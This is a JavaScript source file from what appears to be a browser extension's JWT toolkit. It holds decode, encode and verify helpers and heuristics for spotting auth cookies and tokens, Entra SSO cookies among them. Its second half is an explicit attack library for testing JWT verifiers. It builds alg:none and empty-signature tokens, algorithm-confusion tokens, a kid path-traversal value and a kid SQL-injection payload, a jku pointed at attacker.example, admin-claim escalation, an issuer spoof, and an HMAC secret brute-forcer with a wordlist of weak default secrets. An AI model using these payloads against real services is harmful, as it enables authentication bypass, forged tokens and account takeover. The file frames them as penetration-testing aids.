/**
 * AuthForge — JWT utilities (shared/jwt.js)
 *
 * Pure functions for inspecting and re-encoding JWTs. We never call any
 * network endpoints from here — signature verification with an `HSxxx`
 * secret is supported, but `RSxxx` and `ESxxx` verification require a
 * public key the user pastes in.
 *
 * Why this exists: the reference Cookie-Editor treats values as opaque
 * strings. Most modern auth uses JWTs, and a developer's most common
 * workflow is "decode this token, see when it expires, maybe tweak a claim
 * and re-encode for a test". We make that a one-click operation.
 */

const JWT_REGEX = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/;

/**
 * Decode base64url -> UTF-8 string.
 */
function b64urlDecode(b64) {
  // Pad to a multiple of 4
  const padded = b64.replace(/-/g, '+').replace(/_/g, '/') +
    '='.repeat((4 - (b64.length % 4)) % 4);
  const binary = atob(padded);
  // Reinterpret as UTF-8.
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  return new TextDecoder().decode(bytes);
}

/**
 * Encode a UTF-8 string -> base64url.
 */
function b64urlEncode(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

/**
 * Returns true if the string smells like a JWT. We test the shape and
 * decode the header to confirm — checking the regex alone produces false
 * positives on UUID-like strings with dots.
 */
export function looksLikeJWT(value) {
  if (typeof value !== 'string') return false;
  if (value.length < 20) return false;
  if (!JWT_REGEX.test(value)) return false;
  try {
    const header = JSON.parse(b64urlDecode(value.split('.')[0]));
    // A JWT header always declares "typ" or "alg".
    return Boolean(header && (header.alg || header.typ));
  } catch {
    return false;
  }
}

/**
 * Decode a JWT into its three components. Throws on malformed input —
 * callers should guard with looksLikeJWT() first if they want graceful
 * fallback.
 */
export function decodeJWT(token) {
  if (typeof token !== 'string' || !JWT_REGEX.test(token)) {
    throw new Error('Not a JWT (wrong shape)');
  }
  const [h, p, s] = token.split('.');
  const header = JSON.parse(b64urlDecode(h));
  const payload = JSON.parse(b64urlDecode(p));
  return {
    header,
    payload,
    signature: s,
    raw: { header: h, payload: p, signature: s },
  };
}

/**
 * Re-encode a header+payload as a JWT, signing with an HMAC-SHA secret
 * when one is provided. Pass `secret: null` to leave the signature empty
 * (useful for `alg: none` round-trips you'll fix up by hand).
 *
 * Returns the new token as a string.
 */
export async function encodeJWT(header, payload, secret = null) {
  if (!header || typeof header !== 'object') {
    throw new Error('header must be an object');
  }
  if (!payload || typeof payload !== 'object') {
    throw new Error('payload must be an object');
  }

  const encHeader = b64urlEncode(JSON.stringify(header));
  const encPayload = b64urlEncode(JSON.stringify(payload));
  const signingInput = `${encHeader}.${encPayload}`;

  if (secret == null || header.alg === 'none') {
    return `${signingInput}.`;
  }

  const algToHash = {
    HS256: 'SHA-256',
    HS384: 'SHA-384',
    HS512: 'SHA-512',
  };
  const hash = algToHash[header.alg];
  if (!hash) {
    throw new Error(
      `Signing alg ${header.alg} not supported. Use HS256/HS384/HS512, or set alg to "none".`
    );
  }

  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(secret),
    { name: 'HMAC', hash },
    false,
    ['sign']
  );
  const sigBytes = await crypto.subtle.sign(
    'HMAC',
    key,
    new TextEncoder().encode(signingInput)
  );
  let binary = '';
  for (const b of new Uint8Array(sigBytes)) binary += String.fromCharCode(b);
  const sig = btoa(binary)
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
  return `${signingInput}.${sig}`;
}

/**
 * Verify an HS* signature. Returns true/false. For asymmetric algorithms
 * (RS*, ES*, PS*) this throws — we don't support them here because they
 * need an out-of-band public key.
 */
export async function verifyJWT(token, secret) {
  const { header, raw } = decodeJWT(token);
  const algToHash = {
    HS256: 'SHA-256',
    HS384: 'SHA-384',
    HS512: 'SHA-512',
  };
  const hash = algToHash[header.alg];
  if (!hash) {
    throw new Error(
      `verify: alg ${header.alg} not supported in AuthForge (HS* only)`
    );
  }
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(secret),
    { name: 'HMAC', hash },
    false,
    ['verify']
  );
  // Decode the existing signature to a byte array for verify().
  const padded =
    raw.signature.replace(/-/g, '+').replace(/_/g, '/') +
    '='.repeat((4 - (raw.signature.length % 4)) % 4);
  const sigBin = atob(padded);
  const sigBytes = new Uint8Array(sigBin.length);
  for (let i = 0; i < sigBin.length; i++) sigBytes[i] = sigBin.charCodeAt(i);

  return crypto.subtle.verify(
    'HMAC',
    key,
    sigBytes,
    new TextEncoder().encode(`${raw.header}.${raw.payload}`)
  );
}

/**
 * Inspect a token and return human-readable summary info: issuer, subject,
 * expiry status, time-to-expiry. Used by the UI to badge tokens.
 */
export function summarizeJWT(token) {
  try {
    const { header, payload } = decodeJWT(token);
    const now = Math.floor(Date.now() / 1000);
    const exp = typeof payload.exp === 'number' ? payload.exp : null;
    const iat = typeof payload.iat === 'number' ? payload.iat : null;
    let status = 'unknown';
    if (exp != null) {
      if (exp < now) status = 'expired';
      else if (exp - now < 300) status = 'expiring-soon';
      else status = 'valid';
    } else {
      status = 'no-exp';
    }
    return {
      ok: true,
      alg: header.alg,
      typ: header.typ,
      issuer: payload.iss ?? null,
      subject: payload.sub ?? null,
      audience: payload.aud ?? null,
      issuedAt: iat,
      expiresAt: exp,
      ttlSeconds: exp != null ? exp - now : null,
      status,
    };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

/**
 * Heuristic: looks like an OAuth2 refresh token? Refresh tokens are
 * provider-specific so we can only guess by name. We match on key/cookie
 * names containing typical refresh-token markers.
 */
/**
 * Heuristic: looks like an OAuth2 refresh token? Refresh tokens are
 * provider-specific so we can only guess by name. We match on key/cookie
 * names containing typical refresh-token markers, including the
 * conventions used by MSAL.js (Microsoft), OIDC client libraries, and
 * common SPA storage layouts.
 *
 * Examples that match:
 *   - "refresh_token"
 *   - "refreshToken"
 *   - "refreshtoken"
 *   - "rt"
 *   - "<clientId>-login.windows.net-refreshtoken-<clientId>--"  (MSAL.js)
 *   - "msal.token.renewal.refresh"
 *   - "auth.refreshToken"
 *   - "oidc.user:https://issuer/realm"  (refresh stored within)
 */
export function looksLikeRefreshTokenKey(key) {
  if (typeof key !== 'string') return false;
  const lower = key.toLowerCase();
  return (
    lower.includes('refresh') ||
    lower === 'rt' ||
    lower.endsWith('_rt') ||
    lower.endsWith('.rt') ||
    lower.includes('refreshtoken') ||
    lower.includes('-refreshtoken-')
  );
}

/**
 * Heuristic: a sensitive token / credential / auth artifact in general.
 * Broader than the refresh-token check — covers access tokens, id tokens,
 * MSAL cache keys, OIDC libraries, and common framework conventions.
 *
 * Used by the Tokens tab to surface anything that *might* be sensitive,
 * not just JWT-shaped or strictly refresh-shaped values.
 */
export function looksLikeAuthArtifactKey(key) {
  if (typeof key !== 'string') return false;
  const lower = key.toLowerCase();
  // Anything obviously credential-like
  if (
    lower.includes('refresh') ||
    lower.includes('accesstoken') ||
    lower.includes('access_token') ||
    lower.includes('access-token') ||
    lower.includes('idtoken') ||
    lower.includes('id_token') ||
    lower.includes('id-token') ||
    lower.includes('bearer') ||
    lower.includes('jwt') ||
    lower.includes('oauth') ||
    lower.includes('oidc') ||
    lower.includes('credential') ||
    lower.endsWith('.token') ||
    lower.startsWith('token.') ||
    lower === 'token' ||
    lower === 'auth' ||
    lower === 'authorization' ||
    lower === 'session' ||
    lower === 'sessionid' ||
    lower === 'sid'
  ) {
    return true;
  }
  // MSAL.js conventions (Microsoft Authentication Library)
  if (
    lower.startsWith('msal.') ||
    lower.startsWith('msal-') ||
    lower.includes('-login.windows.net-') ||
    lower.includes('-login.microsoftonline.com-') ||
    lower.includes('-accesstoken-') ||
    lower.includes('-refreshtoken-') ||
    lower.includes('-idtoken-')
  ) {
    return true;
  }
  // Microsoft Entra / Azure AD browser SSO artifacts. These are
  // browser-accessible credentials issued by login.microsoftonline.com that,
  // while not PRTs themselves, prove an active Entra session and can be
  // replayed for session hijacking.
  if (
    lower === 'estsauth' ||
    lower === 'estsauthpersistent' ||
    lower === 'estsauthlight' ||
    lower === 'buid' ||
    lower === 'esctx' ||
    lower === 'fpc' ||
    // Microsoft Account / Live ID cookies
    lower === 'mspauth' ||
    lower === 'mspprof' ||
    lower === 'msprequ' ||
    lower === 'mspok' ||
    lower === 'mspcid' ||
    lower === 'rpsauth' ||
    lower === 'rpssecauth' ||
    lower === 'wlssc' ||
    // The closest browser-visible thing to a Primary Refresh Token:
    // the x-ms-RefreshTokenCredential cookie/header injected during Edge
    // SSO and by the Windows Accounts Chrome extension. It IS browser-
    // accessible and is what most "browser PRT theft" research targets.
    lower === 'x-ms-refreshtokencredential' ||
    lower === 'x-ms-prt' ||
    lower === 'x-ms-deviceauthkey' ||
    // WAM (Web Account Manager) Chromium extension cookies
    lower.includes('wam_') ||
    // AppCacheData / Token Broker Resource (TBRES) markers
    lower.startsWith('tbres_')
  ) {
    return true;
  }
  // Generic api/secret keys (lower-precedence)
  if (
    /api[_-]?key/i.test(key) ||
    /secret/i.test(key) ||
    /private[_-]?key/i.test(key)
  ) {
    return true;
  }
  return false;
}

/**
 * Classify the framework/auth-library a key likely belongs to, for nicer
 * labelling in the UI. Returns null when nothing matches.
 */
export function classifyAuthArtifact(key) {
  if (typeof key !== 'string') return null;
  const lower = key.toLowerCase();

  // MSAL.js — Microsoft. Cache entries follow a predictable shape:
  //   <clientId>.<homeAccountId>-<environment>-<type>-<clientId>--<realm>
  if (lower.startsWith('msal.') || lower.includes('-login.windows.net-')
      || lower.includes('-login.microsoftonline.com-')) {
    if (lower.includes('refreshtoken')) return { framework: 'MSAL', type: 'refresh-token-cache' };
    if (lower.includes('accesstoken')) return { framework: 'MSAL', type: 'access-token-cache' };
    if (lower.includes('idtoken')) return { framework: 'MSAL', type: 'id-token-cache' };
    if (lower.includes('account')) return { framework: 'MSAL', type: 'account-cache' };
    if (lower.includes('encryption')) return { framework: 'MSAL', type: 'cache-encryption-key' };
    return { framework: 'MSAL', type: 'cache-entry' };
  }
  // Microsoft Entra browser-SSO cookies. These are the closest the browser
  // gets to seeing actual Entra credentials — replayable session cookies
  // issued by login.microsoftonline.com.
  if (lower === 'estsauth' || lower === 'estsauthpersistent' || lower === 'estsauthlight') {
    return { framework: 'Entra', type: 'sso-session-cookie' };
  }
  if (lower === 'buid' || lower === 'esctx' || lower === 'fpc') {
    return { framework: 'Entra', type: 'sso-state-cookie' };
  }
  // The closest browser-accessible thing to a Primary Refresh Token:
  // injected by Edge's account broker / Windows-Accounts extension during
  // device-bound SSO. Real PRTs live in LSASS/TPM and cannot be read from a
  // browser context — this is the PRT *derivative* visible in flight.
  if (lower === 'x-ms-refreshtokencredential' || lower === 'x-ms-prt') {
    return { framework: 'Entra', type: 'prt-derived-cookie' };
  }
  if (lower === 'x-ms-deviceauthkey') {
    return { framework: 'Entra', type: 'device-auth-key' };
  }
  // Microsoft Account / Live ID — the consumer-side equivalent
  if (
    lower === 'mspauth' || lower === 'mspprof' || lower === 'msprequ' ||
    lower === 'mspok' || lower === 'mspcid' ||
    lower === 'rpsauth' || lower === 'rpssecauth' || lower === 'wlssc'
  ) {
    return { framework: 'Microsoft Account', type: 'session-cookie' };
  }
  // oidc-client / oidc-client-ts
  if (lower.startsWith('oidc.user:') || lower.startsWith('oidc.')) {
    return { framework: 'oidc-client', type: 'session' };
  }
  // Auth0 SPA SDK
  if (lower.startsWith('@@auth0spajs@@') || lower.includes('auth0.is.authenticated')) {
    return { framework: 'Auth0', type: 'cache-entry' };
  }
  // AWS Amplify / Cognito
  if (lower.startsWith('cognitoidentityserviceprovider.') ||
      lower.includes('amplify-signin-with-hostedui')) {
    return { framework: 'Cognito', type: 'session' };
  }
  // Firebase Auth
  if (lower.startsWith('firebase:authuser:') || lower.includes('firebase:host:')) {
    return { framework: 'Firebase', type: 'session' };
  }
  // Okta auth-js
  if (lower.startsWith('okta-') || lower.includes('okta-token-storage')) {
    return { framework: 'Okta', type: 'token-storage' };
  }
  // Keycloak
  if (lower.startsWith('kc-callback-') || lower === 'kc_idp_hint') {
    return { framework: 'Keycloak', type: 'session' };
  }
  return null;
}

// ============================================================================
// Attack helpers (for security testing of JWT-consuming services)
//
// Each helper produces a *new* token variant. None of these are useful for
// real production hardening — they exist so a tester can quickly produce the
// canonical "is this server vulnerable to X?" payloads without hand-crafting
// base64url segments. The companion UI in the Options page wires them up to
// preset buttons.
//
// Important: these helpers run entirely client-side. AuthForge does not
// fetch keys or call out to anything; an attacker model where the extension
// itself is hostile is out of scope (it's your browser, you installed it).
// ============================================================================

/**
 * Strip signature verification by setting the alg to "none" and using an
 * empty signature. Tests CVE-2015-9235-class bypasses.
 *
 *   header.alg = "none"
 *   signature  = ""
 */
export function attackAlgNone(decoded) {
  const header = { ...decoded.header, alg: 'none' };
  const payload = { ...decoded.payload };
  const enc =
    b64urlEncode(JSON.stringify(header)) +
    '.' +
    b64urlEncode(JSON.stringify(payload)) +
    '.';
  return { token: enc, header, payload };
}

/**
 * Keep the alg unchanged but emit an empty signature. Some older JWT libraries
 * (or misconfigured custom verifiers) treat the empty signature as a match.
 */
export function attackEmptySignature(decoded) {
  const header = { ...decoded.header };
  const payload = { ...decoded.payload };
  const enc =
    b64urlEncode(JSON.stringify(header)) +
    '.' +
    b64urlEncode(JSON.stringify(payload)) +
    '.';
  return { token: enc, header, payload };
}

/**
 * Algorithm confusion: switch alg from RS256/ES256 to HS256 (so the verifier
 * uses the *public* key as the HMAC secret). Caller supplies the public key
 * material (PEM string) as `publicKeyForHmac` to actually sign — without
 * that we just produce the unsigned variant and the user pastes the public
 * key into the playground's secret field.
 */
export async function attackAlgConfusion(decoded, publicKeyForHmac = null) {
  const header = { ...decoded.header, alg: 'HS256' };
  const payload = { ...decoded.payload };
  if (publicKeyForHmac) {
    const token = await encodeJWT(header, payload, publicKeyForHmac);
    return { token, header, payload };
  }
  // No key supplied — emit an unsigned variant for the tester to sign manually
  return {
    token:
      b64urlEncode(JSON.stringify(header)) +
      '.' +
      b64urlEncode(JSON.stringify(payload)) +
      '.',
    header,
    payload,
    note:
      'Paste the server\'s public key (PEM) into the secret field and click "Re-sign" to complete the confusion attack.',
  };
}

/**
 * Produce a variant with one or more claims mutated. Returns *unsigned* by
 * default; pass a secret to sign.
 *
 *   mutateClaims(decoded, { exp: futureTs, role: 'admin' })
 */
export async function mutateClaims(decoded, mutations, secret = null) {
  const header = { ...decoded.header };
  const payload = { ...decoded.payload, ...mutations };
  if (secret && /^HS(256|384|512)$/.test(header.alg)) {
    const token = await encodeJWT(header, payload, secret);
    return { token, header, payload };
  }
  const enc =
    b64urlEncode(JSON.stringify(header)) +
    '.' +
    b64urlEncode(JSON.stringify(payload)) +
    '.';
  return { token: enc, header, payload };
}

/**
 * Inject a malicious `kid` (key ID) value. Tests path-traversal and SQLi in
 * naive `kid` handlers that look up keys by filesystem path or database id.
 */
export function attackKidInjection(decoded, kidValue) {
  const header = { ...decoded.header, kid: kidValue };
  const payload = { ...decoded.payload };
  const enc =
    b64urlEncode(JSON.stringify(header)) +
    '.' +
    b64urlEncode(JSON.stringify(payload)) +
    '.';
  return { token: enc, header, payload };
}

/**
 * Inject a `jku` (JWK Set URL) pointing at an attacker-controlled URL. Tests
 * verifiers that blindly fetch keys from the URL in the header.
 */
export function attackJkuInjection(decoded, jkuUrl) {
  const header = { ...decoded.header, jku: jkuUrl };
  const payload = { ...decoded.payload };
  const enc =
    b64urlEncode(JSON.stringify(header)) +
    '.' +
    b64urlEncode(JSON.stringify(payload)) +
    '.';
  return { token: enc, header, payload };
}

/**
 * Try a list of candidate secrets against the token. Returns the first one
 * that produces a matching signature, or null. Caller can pass a custom list
 * to extend or replace the defaults. Stops at first hit. Times out after
 * `maxAttempts` to keep the UI responsive.
 *
 * Only meaningful for HS256/384/512 tokens. Asymmetric tokens return null
 * immediately.
 */
export async function tryHmacSecrets(token, secrets, onProgress = null) {
  let decoded;
  try {
    decoded = decodeJWT(token);
  } catch {
    return { found: null, attempted: 0, applicable: false };
  }
  if (!/^HS(256|384|512)$/.test(decoded.header.alg)) {
    return { found: null, attempted: 0, applicable: false };
  }

  let attempted = 0;
  for (const candidate of secrets) {
    attempted++;
    if (onProgress && attempted % 25 === 0) {
      onProgress(attempted, secrets.length, candidate);
      // Yield to the event loop so the UI can paint
      await new Promise((r) => setTimeout(r, 0));
    }
    try {
      if (await verifyJWT(token, candidate)) {
        return { found: candidate, attempted, applicable: true };
      }
    } catch {
      // verifyJWT throws on malformed tokens; we've already validated above,
      // so any throw here means a bad candidate — skip.
    }
  }
  return { found: null, attempted, applicable: true };
}

/**
 * Build the canonical set of attack variants for a given decoded JWT. The
 * Options page renders these as a list of one-click presets.
 */
export async function generateAttackVariants(decoded, opts = {}) {
  const futureExp = Math.floor(Date.now() / 1000) + 365 * 24 * 3600;
  const pastExp = Math.floor(Date.now() / 1000) - 7 * 24 * 3600;
  const futureNbf = Math.floor(Date.now() / 1000) + 365 * 24 * 3600;
  const variants = [];

  // ============================================================================
  // ATTACKS — signature / verification bypass attempts. A 2xx response from
  // the server on any of these is a likely vulnerability.
  // ============================================================================

  variants.push({
    id: 'alg-none',
    name: 'alg: none',
    category: 'attack',
    severity: 'high',
    description:
      'Strips signature verification entirely. Tests for libraries that accept ' +
      'alg=none — the original "JWT none algorithm" bypass.',
    ...attackAlgNone(decoded),
  });

  variants.push({
    id: 'empty-sig',
    name: 'Empty signature, alg unchanged',
    category: 'attack',
    severity: 'high',
    description:
      'Keeps the original alg header but supplies an empty signature. Catches ' +
      'naive verifiers that only check signature *presence* lazily.',
    ...attackEmptySignature(decoded),
  });

  if (/^[RE]S/.test(decoded.header.alg)) {
    variants.push({
      id: 'alg-confusion',
      name: 'Algorithm confusion → HS256',
      category: 'attack',
      severity: 'high',
      description:
        'Swaps the asymmetric alg to HS256 so the verifier treats the public ' +
        'key as the HMAC secret. To complete the attack, fetch the public key ' +
        'from the issuer\'s JWKS (e.g. .well-known/openid-configuration → jwks_uri) ' +
        'and sign this token with it as the HMAC key. Many JWT libraries that ' +
        'accept multiple algorithms by default are vulnerable.',
      ...(await attackAlgConfusion(decoded)),
    });
  }

  variants.push({
    id: 'kid-traversal',
    name: 'kid: path traversal',
    category: 'attack',
    severity: 'medium',
    description:
      'Sets kid to "../../../../dev/null". Tests verifiers that resolve kid ' +
      'as a filesystem path and load a known-content file (often signing with ' +
      'an empty key).',
    ...attackKidInjection(decoded, '../../../../dev/null'),
  });

  variants.push({
    id: 'kid-sqli',
    name: 'kid: SQL injection',
    category: 'attack',
    severity: 'medium',
    description:
      'Sets kid to a SQL-injection payload. Tests verifiers that look up keys ' +
      'in a database by kid value.',
    ...attackKidInjection(decoded, "x' UNION SELECT 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA' -- "),
  });

  variants.push({
    id: 'jku-injection',
    name: 'jku: attacker-hosted JWKS',
    category: 'attack',
    severity: 'medium',
    description:
      'Sets jku to a remote URL the attacker controls. Tests verifiers that ' +
      'fetch the JWK Set from a URL in the header without allowlisting. To ' +
      'complete the attack, host a JWKS at the target URL containing your ' +
      'public key and sign this token with the matching private key.',
    ...attackJkuInjection(decoded, 'https://attacker.example/jwks.json'),
  });

  variants.push({
    id: 'privilege-escalation',
    name: 'Privilege escalation claims',
    category: 'attack',
    severity: 'high',
    description:
      'Sets common admin/role claims (admin=true, role=admin, etc.). ' +
      'Tests whether the server trusts client-supplied authorization claims. ' +
      'Note: this variant is unsigned — pair with alg:none or a recovered HMAC ' +
      'secret to weaponise.',
    ...(await mutateClaims(decoded, buildEscalationClaims(decoded))),
  });

  // ============================================================================
  // TESTS — bound-condition tests. A 2xx on these reveals weak validation
  // (servers should reject) but doesn't necessarily prove a full bypass.
  // ============================================================================

  variants.push({
    id: 'expired-replay',
    name: 'Expired token (exp in past)',
    category: 'test',
    severity: 'medium',
    description:
      'Sets exp to 7 days ago. Tests whether the server actually enforces ' +
      'expiry — some servers cache or skip the exp check. Variant is unsigned, ' +
      'so a 2xx here means the server isn\'t checking the signature either.',
    ...(await mutateClaims(decoded, { exp: pastExp })),
  });

  variants.push({
    id: 'nbf-future',
    name: 'Future-dated (nbf in future)',
    category: 'test',
    severity: 'low',
    description:
      'Sets nbf to 1 year in the future. Tests whether the server enforces ' +
      'nbf (not-before). Many implementations skip this entirely. Useful for ' +
      'detecting weak validation pipelines.',
    ...(await mutateClaims(decoded, { nbf: futureNbf })),
  });

  variants.push({
    id: 'bump-exp',
    name: 'Bump exp by 1 year (unsigned)',
    category: 'test',
    severity: 'medium',
    description:
      'Mints a long-lived variant. A 2xx here means the server is accepting ' +
      'unsigned tokens (effectively alg:none) — useful as a tighter check than ' +
      'the explicit alg:none variant since exp is the only thing changed.',
    ...(await mutateClaims(decoded, { exp: futureExp })),
  });

  // Audience confusion — only emitted if `aud` is present so we have
  // something concrete to vary. Tests servers that don't bind tokens to
  // their intended resource.
  if (decoded.payload.aud) {
    const altAud = chooseAlternateAudience(decoded.payload.aud);
    if (altAud) {
      variants.push({
        id: 'aud-confusion',
        name: 'Audience confusion (aud=' + truncForName(altAud) + ')',
        category: 'test',
        severity: 'medium',
        description:
          'Changes the aud claim to a different value (' + altAud + '). Tests ' +
          'whether the server is doing strict audience binding, or just signature ' +
          'validation. If you replay this against the original endpoint and get ' +
          '2xx, the server isn\'t checking aud — token leakage to another service ' +
          'is exploitable.',
        ...(await mutateClaims(decoded, { aud: altAud })),
      });
    }
  }

  // Issuer spoof — only useful when alg:none works, but cheap to include
  if (decoded.payload.iss) {
    variants.push({
      id: 'iss-spoof',
      name: 'Issuer spoof',
      category: 'test',
      severity: 'medium',
      description:
        'Swaps iss to a different authority. A 2xx here (combined with weak ' +
        'signature validation) lets you forge tokens that appear to come from ' +
        'a trusted IdP. Most servers should reject this on signature mismatch alone.',
      ...(await mutateClaims(decoded, { iss: 'https://attacker.example' })),
    });
  }

  return variants;
}

function buildEscalationClaims(decoded) {
  const escalation = {};
  if (!('admin' in decoded.payload)) escalation.admin = true;
  if (decoded.payload.role !== undefined) escalation.role = 'admin';
  if (decoded.payload.roles !== undefined) escalation.roles = ['admin'];
  if (decoded.payload.scope !== undefined) escalation.scope = 'admin';
  if (decoded.payload.isAdmin !== undefined) escalation.isAdmin = true;
  if (decoded.payload.permissions !== undefined) escalation.permissions = ['*'];
  if (Object.keys(escalation).length === 0) {
    escalation.admin = true;
    escalation.role = 'admin';
  }
  return escalation;
}

function chooseAlternateAudience(aud) {
  // If aud is an array, pick a value different from the first; else swap to
  // a well-known Microsoft Graph audience (the most common audience-confusion
  // target in Entra-based environments).
  if (Array.isArray(aud)) {
    return aud[1] || null;
  }
  if (typeof aud === 'string') {
    if (aud.includes('graph.microsoft.com')) {
      return 'https://management.azure.com';
    }
    if (aud.includes('management.azure.com')) {
      return 'https://graph.microsoft.com';
    }
    // Generic: append a path so it's clearly different but plausible
    return aud.replace(/\/?$/, '/v2');
  }
  return null;
}

function truncForName(s, n = 30) {
  s = String(s);
  return s.length > n ? s.slice(0, n) + '…' : s;
}

/**
 * Default wordlist for HS* brute force. Kept short — these are the public
 * defaults and the literal placeholders shipped in JWT library docs. A real
 * red-team will substitute a longer list.
 */
export const DEFAULT_HMAC_SECRETS = [
  // jwt.io's literal placeholder default — astonishingly common in production
  'your-256-bit-secret',
  'your-384-bit-secret',
  'your-512-bit-secret',
  // Empty and one-character keys
  '',
  ' ',
  'a',
  '1',
  // Generic dev placeholders
  'secret',
  'Secret',
  'SECRET',
  'secret123',
  'mysecret',
  'mysecretkey',
  'mySecret',
  'changeme',
  'change-me',
  'changeit',
  'jwt-secret',
  'jwt_secret',
  'jwtSecret',
  'jwt',
  'JWT',
  'token',
  'secretkey',
  'secret-key',
  'secret_key',
  'private',
  'privatekey',
  // Common dev defaults
  'password',
  'Password',
  'admin',
  'administrator',
  'test',
  'testing',
  'demo',
  'dev',
  'development',
  'super-secret',
  'supersecret',
  'topsecret',
  'somesecret',
  'thisisasecret',
  'thisisthesecret',
  'thisIsASecretKey',
  // Numeric defaults
  '123456',
  '12345678',
  '1234567890',
  'qwerty',
  'letmein',
  // Common framework defaults
  'changemenowyoufool',
  'iss-a-secret',
  'PleaseChangeMe',
  'NEVER_USE_THIS_DEFAULT_SECRET',
  // App-name-style guesses
  'app-secret',
  'api-secret',
  'auth-secret',
  'session-secret',
  'cookie-secret',
];
